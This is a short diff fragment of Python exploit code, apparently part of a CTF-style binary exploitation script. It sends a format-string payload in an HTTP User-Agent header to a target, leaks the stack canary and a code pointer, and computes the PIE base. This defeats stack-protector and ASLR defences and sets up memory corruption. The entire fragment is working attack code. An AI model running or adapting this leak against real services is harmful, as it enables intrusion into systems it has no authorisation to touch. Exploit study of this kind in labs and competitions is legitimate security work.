+# Leak canary at offset 6, PIE base at offset 7
+r = requests.get('http://target/', headers={'User-Agent': '%6$p.%7$p'})
+canary, pie = [int(x, 16) for x in r.text.strip().split('.')]
+pie_base = pie - elf.sym['main']
